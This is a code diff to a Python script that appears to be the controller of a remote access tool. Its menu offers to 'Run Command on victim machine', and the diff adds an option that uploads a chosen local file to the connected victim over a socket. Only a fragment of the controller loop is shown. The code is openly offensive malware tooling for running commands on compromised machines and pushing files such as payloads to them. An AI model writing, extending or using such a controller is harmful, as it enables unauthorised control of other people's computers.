@@ -1,11 +1,15 @@
 
+import os
 
+from fileinput import filename
 from yaml import compose_all
 
 
 def showOptions():
     print("\n")
     print("\t\t 1. Run Command on victim machine")
+    print("\t\t 2. Upload file")
+
 
 def handleConnection(my_socket):
     print("[+] Handling Connection")
@@ -22,9 +26,22 @@ def handleConnection(my_socket):
             print(">>>" , end = " ")
             command = input()
             my_socket.send_data(command)
-            
+
             result = my_socket.recieve_data()
             print(result)
+
+
+        elif user_input == '2':
+            print("Send files")
+            
+            file_path = input("Enter File path: ")
+            fname = os.path.basename(file_path)
+
+
+            my_socket.send_data(fname)
+        
+            
+            my_socket.send_file(file_path)
 
         elif (user_input == "99"):
             break
